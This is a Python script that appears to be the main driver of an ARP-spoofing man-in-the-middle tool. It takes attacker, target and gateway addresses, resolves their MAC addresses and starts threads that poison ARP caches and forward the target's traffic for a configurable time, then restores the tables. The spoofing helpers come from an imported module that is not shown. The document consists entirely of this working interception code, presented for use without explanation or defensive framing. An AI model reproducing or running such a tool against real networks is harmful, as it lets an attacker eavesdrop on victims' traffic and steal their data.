from functional import *

REQUIRED_FLAGS = [ '-t', '-i', '-g' ]
DURATION_LIMIT = 300

DEFAULT_ATTACKER  = None
DEFAULT_TARGET    = None
DEFAULT_GATEWAY   = None
DEFAULT_INTERFACE = None
DEFAULT_DURATION  = 45
DEFAULT_TIMEOUT   = 4
DEFAULT_INTERVAL  = 0.1
DEFAULT_VERBOSE   = False
DEFAULT_VERBOSER  = False

def CheckFields(fields):
	for field in fields:
		if not field: return False
	return True

try:
	# Check that all the requirements are met before any computations.
	CheckFlags(REQUIRED_FLAGS, sys.argv)

	# Configure all of the fields to their default values.
	functional_parameters = {
		"Attacker":  DEFAULT_ATTACKER,
		"Target":    DEFAULT_TARGET,
		"Gateway":   DEFAULT_GATEWAY,
		"Interface": DEFAULT_INTERFACE,
		"Duration":  DEFAULT_DURATION,
		"Timeout":   DEFAULT_TIMEOUT,
		"Interval":  DEFAULT_INTERVAL,
		"Verbose":   DEFAULT_VERBOSE,
		"Verboser":  DEFAULT_VERBOSER
	}

	PopulateFields(functional_parameters)
	PrintMessage(f"(Attacker) {functional_parameters["Attacker"]} (Target) {functional_parameters["Target"]} (Gateway) {functional_parameters["Gateway"]}", 0)

	address_fields = [
		functional_parameters["Attacker"],
		functional_parameters["Target"],
		functional_parameters["Gateway"],
	]

	if not CheckFields(address_fields):
		PrintMessage("There was an error whilst verifying the state of the provided addresses. Please ensure that the source, gateway and attacker addresses are provided.")

	# Discover the required MAC addresses for true network functionality.
	attacker_mac  = get_if_hwaddr(functional_parameters["Interface"])
	target_mac    = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"], functional_parameters["Interface"])
	gateway_mac   = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"], functional_parameters["Interface"])
	PrintMessage(f"(Attacker) {attacker_mac} (Target) {target_mac} (Gateway) {gateway_mac}", 0)

	mac_fields = [
		attacker_mac,
		target_mac,
		gateway_mac
	]

	if not CheckFields(mac_fields):
		PrintMessage("There was an error whilst attempting to acquire the designated physical addresses.")

	# Establish multi-threading behaviours for efficient network traversal for each incoming and outgoing packet.
	spoof_thread = threading.Thread(target=Spoof, args=(
		functional_parameters["Verboser"],
		functional_parameters["Interval"],
		functional_parameters["Gateway"],
		gateway_mac,
		functional_parameters["Target"],
		target_mac,
		attacker_mac
	))

	sending_thread   = threading.Thread(target=ForwardSent,     args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))
	receiving_thread = threading.Thread(target=ForwardReceived, args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))

	spoof_thread.start()
	sending_thread.start()
	receiving_thread.start()

	# Handles the running duration of the tool.
	counter = 0
	while counter < functional_parameters["Duration"]:
		# In event of infinite loop, break after pre-configured final limit.
		if counter == DURATION_LIMIT: break

		counter += 1
		time.sleep(1)

	# Return everything back to prior state.
	stop_event.set()

	spoof_thread.join()
	sending_thread.join()
	receiving_thread.join()

	Reset("Exiting gracefully.", functional_parameters["Gateway"], gateway_mac, functional_parameters["Target"], target_mac)
except KeyboardInterrupt:
	stop_event.set()

	spoof_thread.join()
	sending_thread.join()
	receiving_thread.join()

	Reset("Caught keyboard interruption.", functional_parameters["Gateway"], gateway_mac, functional_parameters["Target"], target_mac)
except IndexError:
	PrintMessage("Error whilst indexing the provided arguments. Please check that you have met the sufficient functional criteria.", -1)
except OSError:
	PrintMessage("There was an error involving your operating system. Please ensure that you have provided the correct network interface.", -1)